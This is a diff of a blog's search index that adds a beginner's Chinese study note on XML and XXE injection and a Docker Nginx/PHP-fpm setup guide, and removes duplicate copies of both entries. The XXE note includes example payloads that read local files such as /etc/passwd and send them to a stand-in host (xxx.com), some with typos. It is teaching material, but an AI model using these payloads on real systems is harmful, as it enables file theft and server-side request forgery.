@@ -1,6 +1,93 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>XXE学习笔记</title>
+    <url>/2024/09/11/XML%20&amp;&amp;%20XXE/</url>
+    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
+XML与HTML的不同与html区别：html表示与数据相关，XML更多用于数据传输、存储
+XML结构
+&lt;?xml version=&quot;1.0&quot;?&gt;表示版本号，xml处理解析时的规范&lt;Person&gt;...&lt;/Person&gt;表示根元素，XML文档需有且仅有一个根元素根元素内有两个赋值的嵌套标签子元素&lt;Name&gt;&lt;/Name&gt;,&lt;Age&gt;&lt;/Age&gt;
+
+注意：元素标签名对大小写敏感
+
+上述单独字符不能直接出现，会被错误解析
+实体（ENTITIY）ENTITY就像XML中的变量，可以对其进行赋值，在XML文档的其他地方进行引用，实体在XML的文档类型定义部分（DTD）被单独定义描述
+XML 文档的根元素通常与 DTD 中定义的根元素名称相匹配
+ 
+&lt;!DOCTYPE Person [	&lt;!ENTITY name &quot;XXX&quot;&gt;]&gt;&lt;Person&gt;    &lt;Name&gt;&amp;name;&lt;/Name&gt;    &lt;Age&gt;20&lt;/Age&gt;&lt;/Person&gt;前面的DOCTYPE表示这是一个DTD，用ENTITTY定义了一个叫做name的实体，赋值为XXX;后面可以直接用&amp;跟上实体名引用这个实体，可以防止重复赋值
+
+
+
+DTD分类DTD并不是XML文档的一部分，它们总是在根元素的定义之上-&gt;DTD像实体一样可以从外部加载
+
+一般实体&#x2F;通用实体（general entities）
+  如上面的那个实体
+  引用外部dtd：
+  解析器将从这个外部dtd中提取并解析内容
+  &lt;!DOCTYPE Pwn SYSTEM &quot;xxx.dtd&quot;&gt; dtd的URI&lt;Pwn&gt;test&lt;/Pwn&gt; 是 XML 文档的根元素，它的名字与 DOCTYPE 声明中的名称相匹配。这意味着 Pwn 是这个 XML 文档的根元素，它包含的文本是 test。
+
+
+参数实体
+  必须定义在单独的dtd区域内，参数实体只能在同一个DTD中调用
+  比如，用一个实体给另外一个实体赋值
+  &lt;!ENTITY % outer &lt;!ENTITY inner  &quot;xxx&quot;&gt;&gt;
+
+  ​	常用于XXE（外部实体注入）
+  dtd中调用参数实体
+  参数实体只能在同一个DTD中调用！！！
+  &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE Pwn[	&lt;!ENTITY % outer &quot;&lt;!ENTITY inner SYSTEM &#x27;xxx&#x27;&gt;&quot;&gt;	%outer;]&gt;&lt;Pwn&gt;&amp;inner;&lt;/Pwn&gt;
+
+  
+  XML调用DTD中实体参数的大概流程：XML解释器发现这段代码时，先检查版本；然后发现dtd，这个dtd在xml文档中，可以叫做内联dtd，%开头的是参数实体标志，%outer的值是inner中解析出的东西；调用被赋值的%outer相当于
+
+预定义实体
+  某些特殊符号的一组预定义数值集，这些特殊符号有可能会破坏XML结构（报错），可以选择用其他形式比如十六进制表示这类符号
+  &lt;test&gt;&amp;#x3C;&lt;/test&gt; 这一串十六进制表示了&lt;
+
+XML安全性问题
+ENTITY  实体可以被赋值（存储数据），但是实体功能不止这个，外部实体就是其中一个功能。
+  实体不仅能用来存储指定数值，还可以从本地文件或远程网络中调取相关数据，作为后续实体引用，但是这样带来了广泛的攻击面
+  比如：
+  &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE XXE[&lt;!ENTITY subcribe SYSTEM &quot;secret.txt&quot;&gt;]&gt;&lt;pwn&gt;&amp;subscribe;&lt;/pwn&gt;
+
+  SYSTEM表示后面的内容是外部实体；
+  如果外部实体长得是标签或者和XML很像的东西，XML解析器会报错；
+  这样的实体赋值并不是secret.txt，而是其中的内容，XML在此接收任意有效的URI包括文件，HTTP，ftp和其他协议形式的内容
+  外部实体读取了数据，这种就是外部实体注入攻击（XXE）
+外部实体注入攻击（XXE）分类带内数据  上面的示例涉及的就是带内XXE；
+  XML解析后的输出会直接显示在屏幕上
+基于错误  解析结果只有错误信息（类似Blind XXE）
+带外数据  OOB；真正的盲注，XML解析后无任何输出响应（无回显），必须执行一些带外请求把目标数据提取出来
+  场景：
+  
+  有一个能解析XML但是没有任何输出响应的web应用，为了测试这种盲注XXE，我们可以用非文件路径的外部实体来请求这里的web应用，可以用dns平台监听web应用是否解析了XML，也可以用自己构造好的网站（SYSTEM后的外部实体URL为测试的地方）
+
+
+
+如果监听到了，就说明XML被成功解析，目标web应用正在尝试获取我们构造的网站上的资源作为外部实体，这样我们可以利用受害者的身份发起请求（服务器端请求伪造（SSRF））
+Payloadeg：
+
+&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE XXE[&lt;!ENTINY %passwd SYSTEM &quot;/etc/passwd&quot;&gt;&lt;!ENTINY %wrapper &quot;&lt;!ENTINY send SYSTEM &#x27;http://xxx.com/?passwd;&#x27;&gt;&quot;&gt;%wrapper;]&gt;&lt;pwn&gt;send;&lt;/pwn&gt;XML解释器会先解析/etc/passwd的内容赋值到参数实体%passwd中，然后解析URL中的内容赋给实体send，send再赋给参数实体%wrapper但是这样会报错，根据xml规范， dtd内部子集的参数实体调用不能在实际的标记语言（html，svg等）中来调用参数实体，但是可以在同级别中被当作标记语言调用，外部参数实体不受此限制，可以借助外部dtd绕过这个限制
+
+
+比如payload形式为：
+&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data SYSTEM &quot;/xxx/xx/x/test.dtd&quot;&gt;;&lt;data&gt;&amp;send;&lt;/data&gt; 莫名冒出来的send实体就来自外部的dtd
+
+
+
+%passwd最终会变成URL的一部分
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>XXE &amp;&amp; XML</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>XXE &amp;&amp; XML</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL注入学习笔记</title>
     <url>/2024/06/02/SQL%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
@@ -335,6 +422,161 @@ SIZE列 前面是读写层大小括号内是镜像大小
       </categories>
       <tags>
         <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用Docker搭建Nginx以及PHP-fpm</title>
+    <url>/2025/01/17/docker%E6%90%AD%E5%BB%BAnginx+php-fpm/</url>
+    <content><![CDATA[前言想自己搭建靶场所以学习docker+nginx+php，但是这两天一直卡在配环境上，踩了许多的坑最终才完成环境的配置
+参考了docker部署php和nginx环境_docker nginx php-CSDN博客
+编辑文件如果不喜欢用vim，可以用vscode远程连接然后打开文件夹进行文件编辑等操作
+参考：vscode连接远程服务器（傻瓜式教学）-CSDN博客
+OS：centOS 7.9 64位
+要点
+最好是自己创建一个网络，把php容器和nginx容器都加入该网络中（做了这步就很神奇的可以解析php了）
+自己创建目录结构尽量明了
+nginx容器的根目录路径和php容器的根目录路径要挂载到同一目录
+php.ini需要自己创建
+挂载后根目录中要有index.html等默认页面，不然会报403（刚遇到让人一头雾水）
+nginx的default.conf和nginx.conf一定要配置正确
+有问题多看日志，多拿错误日志信息问问ai（
+
+过程创建自己的网络docker network create mynet
+
+
+ 后续php容器，nginx容器加入该网络
+创建辅助容器创建php和nginx两个容器，用于复制配置文件(仅仅用于辅助，我就没进行端口映射)
+docker run -d --name nginx nginxdocker run -d --name php php:7.3-fpm
+
+
+
+1.参数说明：-d 后台运行 –name 给容器取个名字
+
+
+路径设置
+
+
+使用docker cp命令：
+将容器中路径的内容复制到docker host路径中
+docker cp 容器名:路径 目的路径
+nginx的配置文件位于&#x2F;etc&#x2F;nginx
+nginx的日志文件位于&#x2F;var&#x2F;log
+php配置文件位于&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php
+
+编辑
+
+将nginx和php的配置文件复制到主机的&#x2F;data下，nginx的日志文件复制到&#x2F;data&#x2F;nginx
+
+mkdir /datacd /data#nginxdocker cp nginx:/etc/nginx ./docker cp nginx:/var/log ./nginx
+
+
+
+ 用tree &#x2F;data看一下目录层级有没有正确
+如果没有安装tree
+yum install tree
+
+
+编辑
+复制php配置文件
+编辑
+
+进入php容器，可以用:
+php -i | grep php.ini
+得到配置文件路径
+&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php
+
+#php (工作路径处于/data下)docker cp php:/usr/local/etc/php ./
+
+
+做完以上操作后，目录层级结构如下：
+
+编辑
+做完这些，我们需要将php.ini-development或者php.ini-production中的其中一个改成php.ini
+#工作路径/datamv ./php/php.ini-development ./php/php.ini
+
+
+ 修改后如下
+编辑
+然后我们需要有一个工作目录用来挂载初始页面目录,并且放一个index.html进去（不然到时候会403）
+mkdir ./wwwtouch ./www/index.html
+
+
+ 目录层级如下
+ 编辑
+删除辅助容器#加上-f就不用先停止容器docker rm -f $(docker ps -aq)
+
+
+创建新容器nginx：docker run \-d --name nginx \-p 80:80 \-v /data/nginx/nginx.conf:/etc/nginx/nginx.conf \-v /data/nginx/conf.d/default.conf:/etc/nginx/conf.d/default.conf \-v /data/nginx/log:/var/log/nginx \-v /data/www:/usr/share/nginx/www \--network mynet \nginx
+
+
+
+\1.    我新建了初始页面目录&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www（原本的初始页面目录为&#x2F;usr&#x2F;share        &#x2F;nginx&#x2F;html）,将它挂载到我们创建好的工作目录&#x2F;data&#x2F;www下
+\2.    配置文件一定要正确挂载
+\3.    –network表示加入自己创建的网络mynet
+
+php：docker run \-d --name php \-p 9000:9000 \-v /data/php/php.ini:/usr/local/etc/php/php.ini \-v /data/www:/usr/share/nginx/www \--network mynet \php:7.3-fpm
+
+
+
+\1.    php和nginx的初始页面必须挂载到同一路径
+​      所以在php和nginx的容器内都新建了&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www
+\2.    –network表示加入自己创建的网络mynet
+
+修改配置文件修改default.conf#原本的default.confserver &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    location / &#123;        root   /usr/share/nginx/html;        index  index.html index.htm;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    #location ~ \.php$ &#123;    #    root           html;    #    fastcgi_pass   127.0.0.1:9000;    #    fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;    #    include        fastcgi_params;    #&#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;
+
+
+
+我们需要更改：
+
+将root改为之前设置的初始页面路径&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www
+在location \块中，index中增加index.php
+将location ~ .php$块中的fastcgi_pass改成 php容器名:9000
+fastcgi_param那一行改成：fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+
+
+#修改后的default.confserver &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    root /usr/share/nginx/www;    location / &#123;        # root   /usr/share/nginx/html;        # index  index.html index.htm;        index index.php index.html;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        # root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    location ~ \.php$ &#123;    #    root           html;       fastcgi_pass   php:9000;       fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;       include        fastcgi_params;    &#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;
+
+
+修改nginx.conf在http块中把default.conf的内容复制进去
+#nginx.confuser  nginx;worker_processes  auto;error_log  /var/log/nginx/error.log notice;pid        /var/run/nginx.pid;events &#123;    worker_connections  1024;&#125;http &#123;    include       /etc/nginx/mime.types;    default_type  application/octet-stream;    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;    access_log  /var/log/nginx/access.log  main;    sendfile        on;    #tcp_nopush     on;    keepalive_timeout  65;    #gzip  on;    include /etc/nginx/conf.d/*.conf;    server &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    root /usr/share/nginx/www;    location / &#123;        # root   /usr/share/nginx/html;        # index  index.html index.htm;        index index.php index.html;        try_files $uri $uri/ /info.php?$query_string;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        # root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    location ~ \.php$ &#123;    #    root           html;       fastcgi_pass   php:9000;       fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        access_log /var/log/nginx/fastcgi.log main;        include        fastcgi_params;    &#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;&#125;
+
+
+测试目录挂载与端口映射vscode打开&#x2F;data&#x2F;www&#x2F;index.html
+随便写点html进去
+&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;        &lt;title&gt;the nginx&#x27;s page made by my index.html!&lt;/title&gt;        &lt;style&gt;                html &#123;                        color-scheme: light dark;                &#125;                body &#123;                        width: 35em;                        margin: 0 auto;                        font-family: Tahoma, Verdana, Arial, sans-serif;                &#125;        &lt;/style&gt;&lt;/head&gt;&lt;body&gt;        &lt;h1&gt;the nginx&#x27;s page made by my index.html!&lt;/h1&gt;        &lt;p&gt;If you see this page, the nginx web server is successfully installed and                working. Further configuration is required.&lt;/p&gt;        &lt;p&gt;For online documentation and support please refer to                &lt;a href=&quot;http://bilibili.com/&quot;&gt;bilibili&lt;/a&gt;.&lt;br /&gt;                Commercial support is available at                &lt;a href=&quot;http://bilibili.com/&quot;&gt;bilibili.com&lt;/a&gt;.        &lt;/p&gt;        &lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
+
+
+ 编辑
+若正常显示，证明目录挂载没有出错
+如果遇到403，检查有没有进行端口映射或者工作目录下是不是没有index.html
+检查php能否被解析创建index.php，写入
+&lt;?php phpinfo();?&gt;
+
+
+
+如果在浏览器中输入：
+http:&#x2F;&#x2F;你的dockerhost的ip:nginx端口&#x2F;index.php
+
+有以下结果
+编辑
+证明配置成功
+出现的问题以及解决
+
+nginx容器挂载目录前可以正常访问初始页面，但是进行目录挂载后就显示403：是**因为挂载的工作目录下没有index.html,**相当于挂载了一个空的目录给nginx容器，就无法访问了
+环境及路径都配置好了，访问本机ip也能正常显示挂载的index.html，但是访问php文件出现直接把php文件下载下来或者显示File not found：先查看nginx的日志看一看有没有报错，然后检查default.conf和nginx.conf有没有错误，看一下location &#x2F;块下的index有没有加上index.php,如果容器使用自己创建的网络，配置文件的php块中的fastcgi_pass要写成**php容器名:映射的容器端口,**root设置为容器内的初始页面路径，astcgi_param那一行改成：fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+
+
+最后因为在网上搜索了好多篇博客都未能彻底解决问题，所以才写了这篇博客用于记录自己的踩坑历程和用于日后参考；
+因为是解决问题之后才写的博客，文中的命令也许会有差错，欢迎在评论区指正
+写的不好，希望我的踩坑经历能够帮助到您，蟹蟹(｡･ω･｡)
+]]></content>
+      <categories>
+        <category>Docker</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>Docker</tag>
+        <tag>Nginx</tag>
       </tags>
   </entry>
   <entry>
@@ -707,505 +949,6 @@ eg.模拟v-show
       <tags>
         <tag>Web开发</tag>
         <tag>Vue</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用Docker搭建Nginx以及PHP-fpm</title>
-    <url>/2025/01/17/docker%E6%90%AD%E5%BB%BAnginx+php-fpm/</url>
-    <content><![CDATA[前言想自己搭建靶场所以学习docker+nginx+php，但是这两天一直卡在配环境上，踩了许多的坑最终才完成环境的配置
-参考了docker部署php和nginx环境_docker nginx php-CSDN博客
-编辑文件如果不喜欢用vim，可以用vscode远程连接然后打开文件夹进行文件编辑等操作
-参考：vscode连接远程服务器（傻瓜式教学）-CSDN博客
-OS：centOS 7.9 64位
-要点
-最好是自己创建一个网络，把php容器和nginx容器都加入该网络中（做了这步就很神奇的可以解析php了）
-自己创建目录结构尽量明了
-nginx容器的根目录路径和php容器的根目录路径要挂载到同一目录
-php.ini需要自己创建
-挂载后根目录中要有index.html等默认页面，不然会报403（刚遇到让人一头雾水）
-nginx的default.conf和nginx.conf一定要配置正确
-有问题多看日志，多拿错误日志信息问问ai（
-
-过程创建自己的网络docker network create mynet
-
-
- 后续php容器，nginx容器加入该网络
-创建辅助容器创建php和nginx两个容器，用于复制配置文件(仅仅用于辅助，我就没进行端口映射)
-docker run -d --name nginx nginxdocker run -d --name php php:7.3-fpm
-
-
-
-1.参数说明：-d 后台运行 –name 给容器取个名字
-
-
-路径设置
-
-
-使用docker cp命令：
-将容器中路径的内容复制到docker host路径中
-docker cp 容器名:路径 目的路径
-nginx的配置文件位于&#x2F;etc&#x2F;nginx
-nginx的日志文件位于&#x2F;var&#x2F;log
-php配置文件位于&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php
-
-编辑
-
-将nginx和php的配置文件复制到主机的&#x2F;data下，nginx的日志文件复制到&#x2F;data&#x2F;nginx
-
-mkdir /datacd /data#nginxdocker cp nginx:/etc/nginx ./docker cp nginx:/var/log ./nginx
-
-
-
- 用tree &#x2F;data看一下目录层级有没有正确
-如果没有安装tree
-yum install tree
-
-
-编辑
-复制php配置文件
-编辑
-
-进入php容器，可以用:
-php -i | grep php.ini
-得到配置文件路径
-&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php
-
-#php (工作路径处于/data下)docker cp php:/usr/local/etc/php ./
-
-
-做完以上操作后，目录层级结构如下：
-
-编辑
-做完这些，我们需要将php.ini-development或者php.ini-production中的其中一个改成php.ini
-#工作路径/datamv ./php/php.ini-development ./php/php.ini
-
-
- 修改后如下
-编辑
-然后我们需要有一个工作目录用来挂载初始页面目录,并且放一个index.html进去（不然到时候会403）
-mkdir ./wwwtouch ./www/index.html
-
-
- 目录层级如下
- 编辑
-删除辅助容器#加上-f就不用先停止容器docker rm -f $(docker ps -aq)
-
-
-创建新容器nginx：docker run \-d --name nginx \-p 80:80 \-v /data/nginx/nginx.conf:/etc/nginx/nginx.conf \-v /data/nginx/conf.d/default.conf:/etc/nginx/conf.d/default.conf \-v /data/nginx/log:/var/log/nginx \-v /data/www:/usr/share/nginx/www \--network mynet \nginx
-
-
-
-\1.    我新建了初始页面目录&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www（原本的初始页面目录为&#x2F;usr&#x2F;share        &#x2F;nginx&#x2F;html）,将它挂载到我们创建好的工作目录&#x2F;data&#x2F;www下
-\2.    配置文件一定要正确挂载
-\3.    –network表示加入自己创建的网络mynet
-
-php：docker run \-d --name php \-p 9000:9000 \-v /data/php/php.ini:/usr/local/etc/php/php.ini \-v /data/www:/usr/share/nginx/www \--network mynet \php:7.3-fpm
-
-
-
-\1.    php和nginx的初始页面必须挂载到同一路径
-​      所以在php和nginx的容器内都新建了&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www
-\2.    –network表示加入自己创建的网络mynet
-
-修改配置文件修改default.conf#原本的default.confserver &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    location / &#123;        root   /usr/share/nginx/html;        index  index.html index.htm;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    #location ~ \.php$ &#123;    #    root           html;    #    fastcgi_pass   127.0.0.1:9000;    #    fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;    #    include        fastcgi_params;    #&#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;
-
-
-
-我们需要更改：
-
-将root改为之前设置的初始页面路径&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;www
-在location \块中，index中增加index.php
-将location ~ .php$块中的fastcgi_pass改成 php容器名:9000
-fastcgi_param那一行改成：fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
-
-
-#修改后的default.confserver &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    root /usr/share/nginx/www;    location / &#123;        # root   /usr/share/nginx/html;        # index  index.html index.htm;        index index.php index.html;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        # root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    location ~ \.php$ &#123;    #    root           html;       fastcgi_pass   php:9000;       fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;       include        fastcgi_params;    &#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;
-
-
-修改nginx.conf在http块中把default.conf的内容复制进去
-#nginx.confuser  nginx;worker_processes  auto;error_log  /var/log/nginx/error.log notice;pid        /var/run/nginx.pid;events &#123;    worker_connections  1024;&#125;http &#123;    include       /etc/nginx/mime.types;    default_type  application/octet-stream;    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;    access_log  /var/log/nginx/access.log  main;    sendfile        on;    #tcp_nopush     on;    keepalive_timeout  65;    #gzip  on;    include /etc/nginx/conf.d/*.conf;    server &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    root /usr/share/nginx/www;    location / &#123;        # root   /usr/share/nginx/html;        # index  index.html index.htm;        index index.php index.html;        try_files $uri $uri/ /info.php?$query_string;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        # root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    location ~ \.php$ &#123;    #    root           html;       fastcgi_pass   php:9000;       fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        access_log /var/log/nginx/fastcgi.log main;        include        fastcgi_params;    &#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;&#125;
-
-
-测试目录挂载与端口映射vscode打开&#x2F;data&#x2F;www&#x2F;index.html
-随便写点html进去
-&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;        &lt;title&gt;the nginx&#x27;s page made by my index.html!&lt;/title&gt;        &lt;style&gt;                html &#123;                        color-scheme: light dark;                &#125;                body &#123;                        width: 35em;                        margin: 0 auto;                        font-family: Tahoma, Verdana, Arial, sans-serif;                &#125;        &lt;/style&gt;&lt;/head&gt;&lt;body&gt;        &lt;h1&gt;the nginx&#x27;s page made by my index.html!&lt;/h1&gt;        &lt;p&gt;If you see this page, the nginx web server is successfully installed and                working. Further configuration is required.&lt;/p&gt;        &lt;p&gt;For online documentation and support please refer to                &lt;a href=&quot;http://bilibili.com/&quot;&gt;bilibili&lt;/a&gt;.&lt;br /&gt;                Commercial support is available at                &lt;a href=&quot;http://bilibili.com/&quot;&gt;bilibili.com&lt;/a&gt;.        &lt;/p&gt;        &lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
-
-
- 编辑
-若正常显示，证明目录挂载没有出错
-如果遇到403，检查有没有进行端口映射或者工作目录下是不是没有index.html
-检查php能否被解析创建index.php，写入
-&lt;?php phpinfo();?&gt;
-
-
-
-如果在浏览器中输入：
-http:&#x2F;&#x2F;你的dockerhost的ip:nginx端口&#x2F;index.php
-
-有以下结果
-编辑
-证明配置成功
-出现的问题以及解决
-
-nginx容器挂载目录前可以正常访问初始页面，但是进行目录挂载后就显示403：是**因为挂载的工作目录下没有index.html,**相当于挂载了一个空的目录给nginx容器，就无法访问了
-环境及路径都配置好了，访问本机ip也能正常显示挂载的index.html，但是访问php文件出现直接把php文件下载下来或者显示File not found：先查看nginx的日志看一看有没有报错，然后检查default.conf和nginx.conf有没有错误，看一下location &#x2F;块下的index有没有加上index.php,如果容器使用自己创建的网络，配置文件的php块中的fastcgi_pass要写成**php容器名:映射的容器端口,**root设置为容器内的初始页面路径，astcgi_param那一行改成：fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
-
-
-最后因为在网上搜索了好多篇博客都未能彻底解决问题，所以才写了这篇博客用于记录自己的踩坑历程和用于日后参考；
-因为是解决问题之后才写的博客，文中的命令也许会有差错，欢迎在评论区指正
-写的不好，希望我的踩坑经历能够帮助到您，蟹蟹(｡･ω･｡)
-]]></content>
-      <categories>
-        <category>Docker</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>Docker</tag>
-        <tag>Nginx</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XXE学习笔记</title>
-    <url>/2024/09/11/XML%20&amp;&amp;%20XXE/</url>
-    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
-XML与HTML的不同与html区别：html表示与数据相关，XML更多用于数据传输、存储
-XML结构
-&lt;?xml version=&quot;1.0&quot;?&gt;表示版本号，xml处理解析时的规范&lt;Person&gt;...&lt;/Person&gt;表示根元素，XML文档需有且仅有一个根元素根元素内有两个赋值的嵌套标签子元素&lt;Name&gt;&lt;/Name&gt;,&lt;Age&gt;&lt;/Age&gt;
-
-注意：元素标签名对大小写敏感
-
-上述单独字符不能直接出现，会被错误解析
-实体（ENTITIY）ENTITY就像XML中的变量，可以对其进行赋值，在XML文档的其他地方进行引用，实体在XML的文档类型定义部分（DTD）被单独定义描述
-XML 文档的根元素通常与 DTD 中定义的根元素名称相匹配
- 
-&lt;!DOCTYPE Person [	&lt;!ENTITY name &quot;XXX&quot;&gt;]&gt;&lt;Person&gt;    &lt;Name&gt;&amp;name;&lt;/Name&gt;    &lt;Age&gt;20&lt;/Age&gt;&lt;/Person&gt;前面的DOCTYPE表示这是一个DTD，用ENTITTY定义了一个叫做name的实体，赋值为XXX;后面可以直接用&amp;跟上实体名引用这个实体，可以防止重复赋值
-
-
-
-DTD分类DTD并不是XML文档的一部分，它们总是在根元素的定义之上-&gt;DTD像实体一样可以从外部加载
-
-一般实体&#x2F;通用实体（general entities）
-  如上面的那个实体
-  引用外部dtd：
-  解析器将从这个外部dtd中提取并解析内容
-  &lt;!DOCTYPE Pwn SYSTEM &quot;xxx.dtd&quot;&gt; dtd的URI&lt;Pwn&gt;test&lt;/Pwn&gt; 是 XML 文档的根元素，它的名字与 DOCTYPE 声明中的名称相匹配。这意味着 Pwn 是这个 XML 文档的根元素，它包含的文本是 test。
-
-
-参数实体
-  必须定义在单独的dtd区域内，参数实体只能在同一个DTD中调用
-  比如，用一个实体给另外一个实体赋值
-  &lt;!ENTITY % outer &lt;!ENTITY inner  &quot;xxx&quot;&gt;&gt;
-
-  ​	常用于XXE（外部实体注入）
-  dtd中调用参数实体
-  参数实体只能在同一个DTD中调用！！！
-  &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE Pwn[	&lt;!ENTITY % outer &quot;&lt;!ENTITY inner SYSTEM &#x27;xxx&#x27;&gt;&quot;&gt;	%outer;]&gt;&lt;Pwn&gt;&amp;inner;&lt;/Pwn&gt;
-
-  
